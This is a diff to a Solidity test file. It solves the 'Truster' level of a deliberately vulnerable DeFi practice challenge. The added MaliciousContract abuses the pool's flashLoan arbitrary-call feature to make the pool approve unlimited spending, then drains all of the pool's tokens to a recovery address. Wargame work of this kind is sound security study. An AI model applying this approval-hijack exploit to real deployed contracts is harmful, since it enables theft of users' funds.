@@ -51,7 +51,21 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
+        // This Nonce is 0
+        // TrusterLenderPool(pool).flashLoan(
+        //     0,
+        //     address(pool),
+        //     address(token),
+        //     abi.encodeWithSignature("approve(address,uint256)", player, type(uint256).max)
+        // );
+
+        // token.transferFrom(address(pool), player, token.balanceOf(address(pool)));
+        // token.approve(recovery, token.balanceOf(player));
         
+        // token.transfer(recovery, token.balanceOf(player));
+
+        MaliciousContract maliciousContract = new MaliciousContract();
+        maliciousContract.attack(address(pool), address(token), recovery);
     }
 
     /**
@@ -65,4 +79,28 @@ contract TrusterChallenge is Test {
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
     }
+}
+
+contract MaliciousContract{
+    address pool;
+    DamnValuableToken token;
+    address recovery;
+
+    function attack(address _pool, address _token, address _recovery) external {
+        pool = _pool;
+        token = DamnValuableToken(_token);
+        recovery = _recovery;
+
+        TrusterLenderPool(pool).flashLoan(
+            0,
+            pool,
+            address(token),
+            abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)
+        );
+        token.transferFrom(pool, address(this), token.balanceOf(pool));
+
+        token.transfer(recovery, token.balanceOf(address(this)));
+
+    }
+    
 }
